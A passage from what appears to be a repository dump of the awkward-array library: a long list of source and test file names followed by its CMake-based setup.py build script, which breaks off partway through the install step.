awkward_Content_getitem_next_missing_jagged_getmaskstartstop.cpp awkward_content_reduce_zeroparents_64.cpp awkward_Identities32_to_Identities64.cpp awkward_Identities_extend.cpp awkward_Identities_from_IndexedArray.cpp awkward_Identities_from_ListArray.cpp awkward_Identities_from_ListOffsetArray.cpp awkward_Identities_from_RegularArray.cpp awkward_Identities_from_UnionArray.cpp awkward_Identities_getitem_carry.cpp awkward_IndexedArray_fill.cpp awkward_IndexedArray_fill_count.cpp awkward_IndexedArray_flatten_nextcarry.cpp awkward_IndexedArray_flatten_none2empty.cpp awkward_IndexedArray_getitem_adjust_outindex.cpp awkward_IndexedArray_getitem_carry.cpp awkward_IndexedArray_getitem_nextcarry.cpp awkward_IndexedArray_getitem_nextcarry_outindex.cpp awkward_IndexedArray_getitem_nextcarry_outindex_mask.cpp awkward_IndexedArray_index_of_nulls.cpp awkward_IndexedArray_local_preparenext_64.cpp awkward_IndexedArray_mask.cpp awkward_IndexedArray_numnull.cpp awkward_IndexedArray_numnull_parents.cpp awkward_IndexedArray_numnull_unique.cpp awkward_IndexedArray_overlay_mask.cpp awkward_IndexedArray_ranges_carry_next_64.cpp awkward_IndexedArray_ranges_next_64.cpp awkward_IndexedArray_reduce_next_64.cpp awkward_IndexedArray_reduce_next_fix_offsets_64.cpp awkward_IndexedArray_reduce_next_nonlocal_nextshifts_64.cpp awkward_IndexedArray_reduce_next_nonlocal_nextshifts_fromshifts_64.cpp awkward_IndexedArray_simplify.cpp awkward_IndexedArray_unique_next_index_and_offsets_64.cpp awkward_IndexedArray_validity.cpp awkward_IndexedOptionArray_rpad_and_clip_mask_axis1.cpp awkward_Index_carry.cpp awkward_index_carry_nocheck.cpp awkward_Index_iscontiguous.cpp awkward_Index_nones_as_index.cpp awkward_index_rpad_and_clip_axis0.cpp awkward_index_rpad_and_clip_axis1.cpp awkward_Index_to_Index64.cpp awkward_ListArray_argsort.cpp awkward_ListArray_broadcast_tooffsets.cpp awkward_ListArray_combinations.cpp awkward_ListArray_combinations_length.cpp awkward_ListArray_compact_offsets.cpp awkward_ListArray_fill.cpp awkward_ListArray_getitem_carry.cpp awkward_ListArray_getitem_jagged_apply.cpp awkward_ListArray_getitem_jagged_carrylen.cpp awkward_ListArray_getitem_jagged_descend.cpp awkward_ListArray_getitem_jagged_expand.cpp awkward_ListArray_getitem_jagged_numvalid.cpp awkward_ListArray_getitem_jagged_shrink.cpp awkward_ListArray_getitem_next_array.cpp awkward_ListArray_getitem_next_array_advanced.cpp awkward_ListArray_getitem_next_at.cpp awkward_ListArray_getitem_next_range.cpp awkward_ListArray_getitem_next_range_carrylength.cpp awkward_ListArray_getitem_next_range_counts.cpp awkward_ListArray_getitem_next_range_spreadadvanced.cpp awkward_ListArray_localindex.cpp awkward_ListArray_min_range.cpp awkward_ListArray_num.cpp awkward_ListArray_rpad_and_clip_length_axis1.cpp awkward_ListArray_rpad_axis1.cpp awkward_ListArray_validity.cpp awkward_ListOffsetArray_argsort.cpp awkward_ListOffsetArray_argsort_strings.cpp awkward_ListOffsetArray_compact_offsets.cpp awkward_ListOffsetArray_flatten_offsets.cpp awkward_ListOffsetArray_getitem_adjust_offsets.cpp awkward_ListOffsetArray_getitem_adjust_offsets_index.cpp awkward_ListOffsetArray_local_preparenext_64.cpp awkward_ListOffsetArray_reduce_global_startstop_64.cpp awkward_ListOffsetArray_reduce_local_nextparents_64.cpp awkward_ListOffsetArray_reduce_local_outoffsets_64.cpp awkward_ListOffsetArray_reduce_nonlocal_findgaps_64.cpp awkward_ListOffsetArray_reduce_nonlocal_maxcount_offsetscopy_64.cpp awkward_ListOffsetArray_reduce_nonlocal_nextshifts_64.cpp awkward_ListOffsetArray_reduce_nonlocal_nextstarts_64.cpp awkward_ListOffsetArray_reduce_nonlocal_outstartsstops_64.cpp awkward_ListOffsetArray_reduce_nonlocal_preparenext_64.cpp awkward_ListOffsetArray_rpad_and_clip_axis1.cpp awkward_ListOffsetArray_rpad_axis1.cpp awkward_ListOffsetArray_rpad_length_axis1.cpp awkward_ListOffsetArray_toRegularArray.cpp awkward_localindex.cpp awkward_MaskedArray_getitem_next_jagged_project.cpp awkward_missing_repeat.cpp awkward_new_Identities.cpp awkward_NumpyArray_contiguous_copy.cpp awkward_NumpyArray_contiguous_copy_from_many.cpp awkward_NumpyArray_contiguous_init.cpp awkward_NumpyArray_contiguous_next.cpp awkward_NumpyArray_copy.cpp awkward_NumpyArray_fill.cpp awkward_NumpyArray_fill_frombool.cpp awkward_NumpyArray_fill_fromcomplex.cpp awkward_NumpyArray_fill_scaled.cpp awkward_NumpyArray_fill_tobool.cpp awkward_NumpyArray_fill_tocomplex.cpp awkward_NumpyArray_getitem_boolean_nonzero.cpp awkward_NumpyArray_getitem_boolean_numtrue.cpp awkward_NumpyArray_getitem_next_array.cpp awkward_NumpyArray_getitem_next_array_advanced.cpp awkward_NumpyArray_getitem_next_at.cpp awkward_NumpyArray_getitem_next_null.cpp awkward_NumpyArray_getitem_next_range.cpp awkward_NumpyArray_getitem_next_range_advanced.cpp awkward_NumpyArray_rearrange_shifted.cpp awkward_NumpyArray_reduce_adjust_starts_64.cpp awkward_NumpyArray_reduce_adjust_starts_shifts_64.cpp awkward_NumpyArray_reduce_mask_ByteMaskedArray_64.cpp awkward_NumpyArray_sort_asstrings_uint8.cpp awkward_NumpyArray_subrange_equal.cpp awkward_NumpyArray_unique_ranges.cpp awkward_NumpyArray_unique_strings_uint8.cpp awkward_one_mask.cpp awkward_quick_argsort.cpp awkward_quick_sort.cpp awkward_reduce_argmax.cpp awkward_reduce_argmax_bool_64.cpp awkward_reduce_argmax_complex.cpp awkward_reduce_argmin.cpp awkward_reduce_argmin_bool_64.cpp awkward_reduce_argmin_complex.cpp awkward_reduce_countnonzero.cpp awkward_reduce_countnonzero_complex.cpp awkward_reduce_count_64.cpp awkward_reduce_max.cpp awkward_reduce_max_complex.cpp awkward_reduce_min.cpp awkward_reduce_min_complex.cpp awkward_reduce_prod.cpp awkward_reduce_prod_bool.cpp awkward_reduce_prod_bool_complex.cpp awkward_reduce_prod_complex.cpp awkward_reduce_prod_int32_bool_64.cpp awkward_reduce_prod_int64_bool_64.cpp awkward_reduce_sum.cpp awkward_reduce_sum_bool.cpp awkward_reduce_sum_bool_complex.cpp awkward_reduce_sum_complex.cpp awkward_reduce_sum_int32_bool_64.cpp awkward_reduce_sum_int64_bool_64.cpp awkward_RegularArray_broadcast_tooffsets.cpp awkward_RegularArray_broadcast_tooffsets_size1.cpp awkward_RegularArray_combinations.cpp awkward_RegularArray_compact_offsets.cpp awkward_RegularArray_getitem_carry.cpp awkward_RegularArray_getitem_jagged_expand.cpp awkward_RegularArray_getitem_next_array.cpp awkward_RegularArray_getitem_next_array_advanced.cpp awkward_RegularArray_getitem_next_array_regularize.cpp awkward_RegularArray_getitem_next_at.cpp awkward_RegularArray_getitem_next_range.cpp awkward_RegularArray_getitem_next_range_spreadadvanced.cpp awkward_RegularArray_localindex.cpp awkward_RegularArray_num.cpp awkward_RegularArray_rpad_and_clip_axis1.cpp awkward_regularize_arrayslice.cpp awkward_slicearray_ravel.cpp awkward_slicemissing_check_same.cpp awkward_sort.cpp awkward_sorting_ranges.cpp awkward_sorting_ranges_length.cpp awkward_sort_ascending.cpp awkward_UnionArray_fillindex.cpp awkward_UnionArray_fillindex_count.cpp awkward_UnionArray_fillna.cpp awkward_UnionArray_filltags.cpp awkward_UnionArray_filltags_const.cpp awkward_UnionArray_flatten_combine.cpp awkward_UnionArray_flatten_length.cpp awkward_UnionArray_nestedfill_tags_index.cpp awkward_UnionArray_project.cpp awkward_UnionArray_regular_index.cpp awkward_UnionArray_regular_index_getsize.cpp awkward_UnionArray_simplify.cpp awkward_UnionArray_simplify_one.cpp awkward_UnionArray_validity.cpp awkward_unique.cpp awkward_unique_copy.cpp awkward_unique_offsets.cpp awkward_unique_ranges.cpp awkward_zero_mask.cpp kernel-utils.cpp allocators.cu cuda-utils.cu kernel-utils.cu manual_awkward_ListArray_num.cu BitMaskedArray.cpp ByteMaskedArray.cpp EmptyArray.cpp IndexedArray.cpp ListArray.cpp ListOffsetArray.cpp None.cpp NumpyArray.cpp Record.cpp RecordArray.cpp RegularArray.cpp UnionArray.cpp UnmaskedArray.cpp VirtualArray.cpp ArrayBuilder.cpp ArrayBuilderOptions.cpp BoolBuilder.cpp Builder.cpp Complex128Builder.cpp DatetimeBuilder.cpp Float64Builder.cpp GrowableBuffer.cpp Int64Builder.cpp ListBuilder.cpp OptionBuilder.cpp RecordBuilder.cpp StringBuilder.cpp TupleBuilder.cpp UnionBuilder.cpp UnknownBuilder.cpp Content.cpp ForthInputBuffer.cpp ForthMachine.cpp ForthOutputBuffer.cpp SpecializedJSON.cpp Identities.cpp Index.cpp json.cpp uproot.cpp Iterator.cpp kernel-dispatch.cpp BitMaskedArrayBuilder.cpp ByteMaskedArrayBuilder.cpp EmptyArrayBuilder.cpp FormBuilder.cpp IndexedArrayBuilder.cpp IndexedOptionArrayBuilder.cpp LayoutBuilder.cpp ListArrayBuilder.cpp ListOffsetArrayBuilder.cpp NumpyArrayBuilder.cpp RecordArrayBuilder.cpp RegularArrayBuilder.cpp UnionArrayBuilder.cpp UnmaskedArrayBuilder.cpp IrregularlyPartitionedArray.cpp PartitionedArray.cpp Reducer.cpp Slice.cpp ArrayType.cpp ListType.cpp OptionType.cpp PrimitiveType.cpp RecordType.cpp RegularType.cpp Type.cpp UnionType.cpp UnknownType.cpp util.cpp ArrayCache.cpp ArrayGenerator.cpp content.cpp dlpack_util.cpp forms.cpp forth.cpp identities.cpp index.cpp io.cpp kernel_utils.cpp partition.cpp startup.cpp types.cpp virtual.cpp _ext.cpp list-depths-records-list.parquet list-depths-records.parquet list-depths-simple.parquet list-depths-strings.parquet list-depths.parquet list-lengths.parquet nonnullable-depths.parquet nullable-depths.parquet nullable-levels.parquet nullable-list-depths-records-list.parquet nullable-list-depths-records.parquet nullable-list-depths-strings.parquet nullable-list-depths.parquet nullable-record-primitives-simple.parquet nullable-record-primitives.parquet record-primitives.parquet test-nan-inf.json test-record-array.json test-two-arrays.json test.json zero-record-batches.parquet __init__.py test_0001-refcount.py test_0002-minimal-listarray.py test_0004-design-surrogate-key.py test_0006-deep-iteration.py test_0008-slices-and-getitem.py test_0009-identity-and-getitem.py test_0011-listarray.py test_0013-error-handling-struct.py test_0014-finish-up-getitem.py test_0018-fromiter-fillable.py test_0019-use-json-library.py test_0020-support-unsigned-indexes.py test_0021-emptyarray.py test_0023-regular-array.py test_0024-use-regular-array.py test_0025-record-array.py test_0028-add-dressed-types.py test_0031-pickle-types.py test_0032-replace-dressedtype.py test_0038-emptyarray-astype.py test_0039-no-hanging-types.py test_0042-stubs-for-flatten-operation.py test_0043-strings-vs-bytes.py test_0046-start-indexedarray.py test_0047-missing-odd-fields-in-fillablearray.py test_0049-distinguish-record-and-recordarray-behaviors.py test_0056-partitioned-array.py test_0056b-partitioned-array-numba.py test_0057-virtual-array.py test_0057b-virtual-array-numba.py test_0070-argmin-and-argmax.py test_0072-fillna-operation.py test_0074-argsort-and-sort.py test_0077-zip-operation.py test_0078-argcross-and-cross.py test_0079-argchoose-and-choose.py test_0080-flatpandas-multiindex-rows-and-columns.py test_0082-indexedarray-setidentities.py test_0084-start-unionarray.py test_0086-nep13-ufunc.py test_0089-numpy-functions.py test_0093-simplify-uniontypes-and-optiontypes.py test_0094-getattr-for-record-field.py test_0107-assign-fields-to-records.py test_0110-various-cleanups.py test_0111-jagged-and-masked-getitem.py test_0114-rpad-operation.py test_0115-generic-reducer-operation.py test_0117-finish-the-sizes-operation.py test_0118-numba-cpointers.py test_0119-numexpr-and-broadcast-arrays.py test_0120-autograd-support.py test_0124-strings-in-numba.py test_0127-tomask-operation.py test_0127b-tomask-operation-numba.py test_0135-awkward0-awkward1-converter.py test_0138-emptyarray-type.py test_0150-attributeerrors.py test_0156-array-and-record-constructors.py test_0163-negative-axis-wrap.py test_0166-0167-0170-random-issues.py test_0173-astype-operation.py test_0184-concatenate-operation.py test_0193-is_none-axis-parameter.py test_0198-tutorial-documentation-1.py test_0222-count-with-axis0.py test_0224-arrow-to-awkward.py test_0230-virtualarray-segfault.py test_0231-indexform.py test_0264-reduce-last-empty.py test_0273-path-for-with-field.py test_0274-access-ArrayGenerator-in-Python.py test_0286-broadcast-single-value-with-field.py test_0290-bug-fixes-for-hats.py test_0315-integerindex.py test_0324-fix-partitionedarray-getitem-string-int.py test_0331-pandas-indexedarray.py test_0334-fully-broadcastable-where.py test_0337-numpy-format-integer-size-issues.py test_0339-highlevel-sorting-function.py test_0341-parquet-reader-writer.py test_0344-repr-quote-keys.py test_0348-form-keys.py test_0355-mixins.py test_0381-fill-documentation-stubs-3.py test_0384-lazy-arrayset.py test_0390-virtual-forms.py test_0393-fix-bitmaskedarray-mask.py test_0395-complex-type-arrays.py test_0395-fix-numba-indexedarray.py test_0397-arrays-as-constants-in-numba.py test_0401-add-categorical-type-for-arrow-dictionary.py test_0402-fix-form-getitem-field.py test_0404-array-validity-check.py test_0410-fix-argminmax-positions-for-missing-values.py test_0420-fix-numpyarray-carry-for-noncontiguous.py test_0437-stream-of-many-json-files.py test_0446-fix-flatten-of-sliced-array.py test_0447-preserve-regularness-in-reduce.py test_0449-merge-many-arrays-in-one-pass.py test_0457-remove-broadcasting-over-fields.py test_0473-empty-listarray.py test_0479-lazy-arrays-lose-weak-reference.py test_0484-masked-take-empty-array.py test_0493-zeros-ones-full-like.py test_0494-numba-array-contains.py test_0496-provide-local-index.py test_0499-getitem-indexedarray-bug.py test_0501-string-comparison-bug.py test_0504-block-ufuncs-for-strings.py test_0511-copy-and-deepcopy.py test_0521-matrix-multiplication.py test_0527-fix-unionarray-ufuncs-and-parameters-in-merging.py test_0546-fill_none-replacement-value-type.py test_0549-numba-array-asarray.py test_0552-with_field-should-not-right-broadcast.py test_0557-min-max-initial-argument.py test_0559-fix-booleans-in-numba.py test_0560-setting-virtual-field.py test_0572-numba-array-ndim.py test_0582-propagate-context-in-broadcast_and_apply.py test_0583-implement-unflatten-function.py test_0585-fix-corner-case.py test_0590-allow-regulararray-size-zero.py test_0593-preserve-nullability-in-arrow-and-parquet.py test_0595-0630-default-for-nep18.py test_0597-virtual-virtual-forms.py test_0603-concatenate-should-minimally-touch-laziness.py test_0612-partition-axis_wrap_if_negative.py test_0618-deprecation-for-selecting-within-multiple-records.py test_0627-behavior-from-dict-of-arrays.py test_0628-accept-numpy-integers-in-slices.py test_0634-fill_none-with-record.py test_0645-from-jax.py test_0645-jax-refcount.py test_0645-to-jax.py test_0648-add-forth-machine-to-codebase.py test_0652-tests-of-complex-numbers.py test_0674-categorical-validation.py test_0688-lazy-parquet-with-Forms.py test_0689-fix-dimension-of-empty-slices.py test_0690-array-builder-perf-study.py test_0693-fixes-for-scipy-prep.py test_0699-fixes-for-scipy-prep-2.py test_0702-partitioned-to-arrow.py test_0706-implement-parquet-dataset.py test_0713-getitem_field-should-simplify_optiontype.py test_0719-prevent-nullptr-in-caches.py test_0721-unflatten-partitionedarray.py test_0723-ensure-that-jagged-slice-fits-array-length.py test_0724-fix-flatten-segfault.py test_0730-unflatten-axis-parameter.py test_0733-run_lengths.py test_0734-strings_astype.py test_0736-implement-argsort-for-strings.py test_0740-numpy-scalars-as-numbers.py test_0747-from_parquet-row_groups.py test_0756-num-of-partitioned-recordarrays.py test_0758-ak-zip-scalars.py test_0766-prevent-combinations-of-characters.py test_0771-akArray-dict-constructor-require-equal-lengths.py test_0773-typeparser.py test_0776-numba-booleans-in-virtual-array.py test_0781-forth-machine-error-handling.py test_0783-disambiguate-parquet-list-cache-keys.py test_0788-indexedarray-carrying-recordarray-parameters.py test_0793-jax-element-wise-ops.py test_0794-ak-cartesian-on-empty-array.py test_0798-forbid-Tensor-in-Parquet.py test_0803-argsort-fix-type.py test_0806-empty-lists-cartesian-fix.py test_0812-argsort-empty-union-type-fix.py test_0813-full-like-dtype-arg.py test_0815-broadcast-union-types-to-all-possibilities.py test_0819-issue.py test_0824-fix-akRecord-promote-to-behavior.py test_0828-arrow-datatype-null.py test_0835-datetime-type.py test_0836-nonflat-bools-in-parquet.py test_0846-matrix-multiplication-numpy.py test_0850-argsort-mask-array.py test_0858-complex-array-concatenate.py test_0863-is-none-numpy-array.py test_0866-getitem_field-and-flatten-unions.py test_0868-matrix-multiplication-of-vector.py test_0871-nested-virtual-in-numba.py test_0875-arrow-null-type.py test_0876-fix-lost-slice-array-offset.py test_0879-non-primitive-with-field.py test_0889-ptp.py test_0898-unzip-heterogeneous-records.py test_0899-distinguish-cache-keys-for-non-leaf-nodes.py test_0903-ArrayView-expects-contiguous-NumpyArrays.py test_0905-leading-zeros-in-unflatten.py test_0906-arrow-fixed-size-list-type.py test_0910-unflatten-counts-relation.py test_0912-packed.py test_0916-datetime-values-astype.py test_0917-fill-none-axis.py test_0921-parquet-from-file-like.py test_0924-layout-builder.py test_0927-numpy-array-nbytes.py test_0930-bug-in-unionarray-purelist_parameter.py test_0940-with-cache-already-exists.py test_0945-argsort-sort-nan-array.py test_0973-flatten-multidimensional-numpy-array.py test_0975-mask-multidimensional-numpy-array.py test_0977-array-builder.py test_0979-where-multidimensional-numpy-array.py test_0982-missing-case-in-nonlocal-reducers.py test_0984-ravel.py test_0992-correct-ptp-unmasking.py test_1000-fixes-argmax-for-ListOffsetArray-with-nonzero-start.py test_1006-packed-regular-array-zero-size.py test_1007-from_buffers-empty-ndarray.py test_1012-zip-regular-arrays.py test_1017-numpyarray-broadcast.py test_1026-jagged-slicing-of-multidim-NumpyArray.py test_1030-mixin-class-name.py test_1048-to_numpy-with-RegularArray-of-size-zero.py test_1055-fill_none-numpy-dimension.py test_1066-to_numpy-masked-structured-array.py test_1071-mask-identity-false-should-not-return-option-type.py test_1084-from-json-win-path.py test_1106-argminmax-axis-None-missing-values.py test_1114-fix-copyjson-casting-bug.py test_1136-regulararray-zeros-in-shape.py test_1159-add-json-commands-to-awkwardforth.py test_1170-parquet-files-with-zero-record-batches.py test_1173-numbers_to_type-length.py test_1189-fix-singletons-for-non-optional-data.py test_1192-iterables-in-__array_function__.py test_1193-is-none-nested-option.py test_1214-flattened-record-array-drop-parameters.py test_1247-numpy-to_rectilinear-ndarray.py test_1298-allow-nan_to_num-arguments-to-be-arrays.py test_1302-layout-builder-nested-list.py test_1308-zip-after-option.py test_0002-minimal-listarray.py test_0006-deep-iteration.py test_0008-slices-and-getitem.py test_0011-listarray.py test_0013-error-handling-struct.py test_0014-finish-up-getitem.py test_0018-fromiter-fillable.py test_0019-use-json-library.py test_0020-support-unsigned-indexes.py test_0021-emptyarray.py test_0023-regular-array.py test_0024-use-regular-array.py test_0025-record-array.py test_0028-add-dressed-types.py test_0032-replace-dressedtype.py test_0046-start-indexedarray.py test_0049-distinguish-record-and-recordarray-behaviors.py test_0057-introducing-forms.py test_0070-argmin-and-argmax.py test_0072-fillna-operation.py test_0074-argsort-and-sort.py test_0077-zip-operation.py test_0078-argcross-and-cross.py test_0079-argchoose-and-choose.py test_0084-start-unionarray.py test_0086-nep13-ufunc.py test_0089-numpy-functions.py test_0093-simplify-uniontypes-and-optiontypes.py test_0107-assign-fields-to-records.py test_0111-jagged-and-masked-getitem.py test_0115-generic-reducer-operation.py test_0118-numba-cpointers.py test_0124-strings-in-numba.py test_0127-tomask-operation.py test_0127b-tomask-operation-numba.py test_0138-emptyarray-type.py test_0150-flatten.py test_0163-negative-axis-wrap.py test_0166-0167-0170-random-issues.py test_0173-astype-operation.py test_0184-concatenate-operation.py test_0222-count-with-axis0.py test_0224-arrow-to-awkward.py test_0264-reduce-last-empty.py test_0273-path-for-with-field.py test_0286-broadcast-single-value-with-field.py test_0290-bug-fixes-for-hats.py test_0315-integerindex.py test_0334-fully-broadcastable-where.py test_0339-highlevel-sorting-function.py test_0348-form-keys.py test_0395-complex-type-arrays.py test_0395-fix-numba-indexedarray.py test_0397-arrays-as-constants-in-numba.py test_0404-array-validity-check.py test_0410-fix-argminmax-positions-for-missing-values.py test_0437-stream-of-many-json-files.py test_0447-preserve-regularness-in-reduce.py test_0449-merge-many-arrays-in-one-pass.py test_0493-zeros-ones-full-like.py test_0494-numba-array-contains.py test_0496-provide-local-index.py test_0499-getitem-indexedarray-bug.py test_0504-block-ufuncs-for-strings.py test_0527-fix-unionarray-ufuncs-and-parameters-in-merging.py test_0546-fill_none-replacement-value-type.py test_0549-numba-array-asarray.py test_0557-min-max-initial-argument.py test_0559-fix-booleans-in-numba.py test_0572-numba-array-ndim.py test_0582-propagate-context-in-broadcast_and_apply.py test_0590-allow-regulararray-size-zero.py test_0593-preserve-nullability-in-arrow-and-parquet.py test_0627-behavior-from-dict-of-arrays.py test_0652-tests-of-complex-numbers.py test_0713-getitem_field-should-simplify_optiontype.py test_0723-ensure-that-jagged-slice-fits-array-length.py test_0736-implement-argsort-for-strings.py test_0758-ak-zip-scallars.py test_0766-prevent-combinations-of-characters.py test_0788-indexedarray-carrying-recordarray-parameters.py test_0794-ak-cartesian-on-empty-array.py test_0803-argsort-fix-type.py test_0806-empty-lists-cartesian-fix.py test_0813-full-like-dtype-arg.py test_0828-arrow-datatype-null.py test_0835-datetime-type-pandas.py test_0835-datetime-type-pyarrow.py test_0835-datetime-type.py test_0850-argsort-mask-array.py test_0866-getitem_field-and-flatten-unions.py test_0875-arrow-null-type.py test_0879-non-primitive-with-field.py test_0884-index-and-identifier-refactoring.py test_0889-ptp.py test_0896-content-classes-refactoring.py test_0903-ArrayView-expects-contiguous-NumpyArrays.py test_0906-arrow-fixed-size-list-type.py test_0912-packed.py test_0914-types-and-forms.py test_0916-datetime-values-astype.py test_0927-numpy-array-nbytes.py test_0945-argsort-sort-nan-array.py test_0958-new-forms-must-accept-old-form-json.py test_0959-_getitem_array-implementation.py test_0975-mask-multidimensional-numpy-array.py test_0979-where-multidimentional-numpy-array.py test_0982-missing-case-in-nonlocal-reducers.py test_0984-ravel.py test_0992-correct-ptp-unmasking.py test_1000-fixes-argmax-for-ListOffsetArray-with-nonzero-start.py test_1006-packed-regular-array-zero-size.py test_1007-from_buffers-empty-ndarray.py test_1031-start-getitem_next.py test_1031b-start-getitem_next-specialized.py test_1055-fill_none-numpy-dimension.py test_1059-localindex.py test_1066-to_numpy-masked-structured-array.py test_1071-mask-identity-false-should-not-return-option-type.py test_1072-sort.py test_1074-combinations.py test_1075-validityerror.py test_1106-argminmax-axis-None-missing-values.py test_1110-type-tracer-1.py test_1116-project-maskedarrays.py test_1125-to-arrow-from-arrow.py test_1132-utility-methods-for-highlevel-functions.py test_1134-from-buffers-to-buffers.py test_1135-rpad-operation.py test_1136-regulararray-zeros-in-shape.py test_1137-num.py test_1142-numbers-to-type.py test_1149-datetime-sort.py test_1154-arrow-tables-should-preserve-parameters.py test_1162-ak-from_json_schema.py test_1183-bugs-found-by-dask-project-2.py test_1192-iterables-in-__array_function__.py test_1193-is-none-nested-option.py test_1233-ak-with_name.py test_1240-v2-implementation-of-numba-1.py test_1247-numpy-to_rectilinear-ndarray.py test_1259-simplify_optiontype.py test_1260-simplify-masked-option-types.py test_1271-fix-4D-reducers.py test_1294-to-and-from_parquet.py test_1300-awkward-to-cpp-converter-with-cling.py test_1300b-same-for-numba.py test_1308-zip-after-option.py __init__.py __init__.py test_0345-cuda-num.py test_0345-cuda-transfers.py test_0362-cupy-interop.py test_0362-cupy-refcount.py test_0372-from-cupy.py test_0388-abstract-all-uses-of-numpy.py test_0645-from-jax.py test_0645-jax-interop.py test_0645-jax-refcount.py test_0645-to-jax.py test_1270-install-test.py test_1276-cuda-num.py test_1276-cuda-transfers.py test_1276-cupy-interop.py test_1276-from-cupy.py __init__.py __init__.py VERSION_INFO,"# BSD 3-Clause License; see https://github.com/scikit-hep/awkward-1.0/blob/main/LICENSE

import multiprocessing
import os
import platform
import re
import shutil
import subprocess
import sys

import setuptools
import setuptools.command.build_ext
import setuptools.command.build_py
import setuptools.command.install
from setuptools import setup, Extension
from sysconfig import get_platform


try:
    import cmake

    CMAKE = os.path.join(cmake.CMAKE_BIN_DIR, ""cmake"")
except ModuleNotFoundError:
    CMAKE = ""cmake""

PYTHON = sys.executable


# Convert distutils Windows platform specifiers to CMake -A arguments
PLAT_TO_CMAKE = {
    ""win32"": ""Win32"",
    ""win-amd64"": ""x64"",
    ""win-arm32"": ""ARM"",
    ""win-arm64"": ""ARM64"",
}


with open(""VERSION_INFO"") as f:
    VERSION_INFO = f.read().strip()


def read_requirements(name):
    with open(name) as f:
        return f.read().strip().split(""\n"")


extras = {
    ""cuda"": [f""awkward-cuda-kernels=={VERSION_INFO}""],
    ""test"": read_requirements(""requirements-test.txt""),
    ""dev"": read_requirements(""requirements-dev.txt""),
}
extras[""all""] = sum(extras.values(), [])

install_requires = read_requirements(""requirements.txt"")


class CMakeExtension(Extension):
    def __init__(self, name, sourcedir=""""):
        Extension.__init__(self, name, sources=[])
        self.sourcedir = os.path.abspath(sourcedir)


class CMakeBuild(setuptools.command.build_ext.build_ext):
    def build_extensions(self):
        try:
            subprocess.check_output([CMAKE, ""--version""])
        except OSError:
            raise RuntimeError(
                ""CMake must be installed to build the following extensions: ""
                + "", "".join(x.name for x in self.extensions)
            )

        setuptools.command.build_ext.build_ext.build_extensions(self)

    def build_extension(self, ext):
        extdir = os.path.abspath(os.path.dirname(self.get_ext_fullpath(ext.name)))

        # required for auto-detection of auxiliary ""native"" libs
        if not extdir.endswith(os.path.sep):
            extdir += os.path.sep

        cfg = ""Debug"" if self.debug else ""Release""

        # CMake lets you override the generator - we need to check this.
        # Can be set with Conda-Build, for example.
        cmake_generator = os.environ.get(""CMAKE_GENERATOR"", """")

        # Set Python_EXECUTABLE instead if you use PYBIND11_FINDPYTHON
        # EXAMPLE_VERSION_INFO shows you how to pass a value into the C++ code
        # from Python.
        cmake_args = []
        if ""CMAKE_ARGS"" in os.environ:
            cmake_args += [item for item in os.environ[""CMAKE_ARGS""].split("" "") if item]
        cmake_args += [
            f""-DCMAKE_LIBRARY_OUTPUT_DIRECTORY={extdir}"",
            f""-DPYTHON_EXECUTABLE={sys.executable}"",
            f""-DEXAMPLE_VERSION_INFO={self.distribution.get_version()}"",
            f""-DCMAKE_BUILD_TYPE={cfg}"",  # not used on MSVC, but no harm
            f""-DCMAKE_INSTALL_PREFIX={extdir}"",
            f""-DPYTHON_EXECUTABLE={sys.executable}"",
            ""-DPYBUILD=ON"",
            ""-DBUILD_TESTING=OFF"",
        ]
        build_args = []

        try:
            compiler_path = self.compiler.compiler_cxx[0]
            cmake_args += [f""-DCMAKE_CXX_COMPILER={compiler_path}""]
        except AttributeError:
            print(""Not able to access compiler path, using CMake default"")

        if self.compiler.compiler_type == ""msvc"":
            cmake_args.append(""-DCMAKE_WINDOWS_EXPORT_ALL_SYMBOLS=TRUE"")

            # Single config generators are handled ""normally""
            single_config = any(x in cmake_generator for x in {""NMake"", ""Ninja""})

            # CMake allows an arch-in-generator style for backward compatibility
            contains_arch = any(x in cmake_generator for x in {""ARM"", ""Win64""})

            # Specify the arch if using MSVC generator, but only if it doesn't
            # contain a backward-compatibility arch spec already in the
            # generator name.
            if not single_config and not contains_arch:
                cmake_args += [""-A"", PLAT_TO_CMAKE[self.plat_name]]

            # Multi-config generators have a different way to specify configs
            if not single_config:
                cmake_args += [
                    f""-DCMAKE_LIBRARY_OUTPUT_DIRECTORY_{cfg.upper()}={extdir}""
                ]
                build_args += [""--config"", cfg]

        if ""CMAKE_BUILD_PARALLEL_LEVEL"" not in os.environ:
            build_args += [""-j"", str(multiprocessing.cpu_count())]

        if platform.system() == ""Darwin"":
            if ""MACOSX_DEPLOYMENT_TARGET"" not in os.environ:
                cmake_args += [""-DCMAKE_OSX_DEPLOYMENT_TARGET=10.9""]

            # Cross-compile support for macOS
            archs = re.findall(r""-arch (\S+)"", os.environ.get(""ARCHFLAGS"", """"))
            if archs:
                cmake_args.append(
                    ""-DCMAKE_OSX_ARCHITECTURES:STRING={}"".format("";"".join(archs))
                )

        if not os.path.exists(self.build_temp):
            os.makedirs(self.build_temp)

        subprocess.check_call(
            [CMAKE, ""-S"", ext.sourcedir, ""-B"", self.build_temp] + cmake_args
        )
        subprocess.check_call([CMAKE, ""--build"", self.build_temp] + build_args)
        subprocess.check_call([CMAKE, ""--install"", self.build_temp, ""--config"", cfg])


def tree(x):
    print((""{} (dir)"" if os.path.isdir(x) else ""{}"").format(x))
    if os.path.isdir(x):
        for y in os.listdir(x):
            tree(os.path.join(x, y))


class BuildPy(setuptools.command.build_py.build_py):
    def run(self):
        # generate include/awkward/kernels.h and src/awkward/_kernel_signatures.py
        subprocess.check_call(
            [PYTHON, os.path.join(""dev"", ""generate-kernel-signatures.py"")]
        )

        setuptools.command.build_py.build_py.run(self)


class Install(setuptools.command.install.install):
    def run(self):
        outerdir = os.path.join(
            os.path.join(
                ""build"",
                ""lib.{}-{}.{}"".format(
                    get_platform(),
                    sys.version_info[0],
                    sys.version_info[1],
                ),
            )
        )

        print(""--- this directory --------------------------------------------"")
        for x in sorted(os.listdir(""."")):
            print(x)

        print(""--- build directory -------------------------------------------"")
        tree(""build"")

        print(""--- copying includes ------------------------------------------"")
        # Python 3.8 can use dirs_exist_ok=True instead.
        include_dir = os.path.join(outerdir, ""awkward"", ""include"")
        if os.path.exists(include_dir):
            shutil.rmtree(include_dir)
        shutil.copytree(
            os.path.join(""include""), os.path.join(outerdir, ""awkward"", ""include"")
        )

        print(""--- outerdir after copy ---------------------------------------"")
        tree(outerdir)

        if platform.system() == ""Windows"":
            print(""--- copying libraries -----------------------------------------"")
            dlldir = os.path.join(
                os.path.join(
                    ""build"",
                    ""temp.%s-%d.%d""
                    % (
